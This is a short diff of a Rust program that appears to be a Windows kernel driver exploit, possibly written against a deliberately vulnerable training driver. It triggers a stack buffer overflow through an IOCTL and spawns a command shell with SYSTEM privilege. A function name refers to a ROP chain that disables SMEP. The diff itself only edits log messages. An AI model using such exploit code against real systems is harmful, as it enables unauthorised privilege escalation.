@@ -52,7 +52,7 @@ fn main() {
 
     /* Send the control code with buffer to the vulnerable driver */
     println!("[+] Triggering Stack Buffer Overflow");
-    println!("\t[*] Buffer: {:?}", buffer);
+    //println!("\t[*] Buffer: {:?}", buffer);
     println!("\t[*] Buffer Length: {}", buffer.len());
     println!(
         "\t[*] Sending IOCTL Code: {:#x}",
@@ -70,13 +70,11 @@ fn main() {
     };
 
     /* We have successfully elevated our privileges */
-    println!("[+] Spawning CMD with SYSTEM privilege");
+    println!("[+] Spawning CMD with SYSTEM Privilege");
     let _pid = match spawn_shell() {
-        Ok(_) => println!("\t[*] Successfully Spawned CMD with NT AUTHORITY\\SYSTEM Privilege"),
+        Ok(_) => println!("[+] W00TW00T NT AUTHORITY\\SYSTEM"),
         Err(e) => panic!("[-] Failed to spawn CMD: {}", e),
     };
-
-    println!("[+] W00TW00T NT AUTHORITY\\SYSTEM");
 }
 
 pub fn search_build_smep_disable_rop_chain(
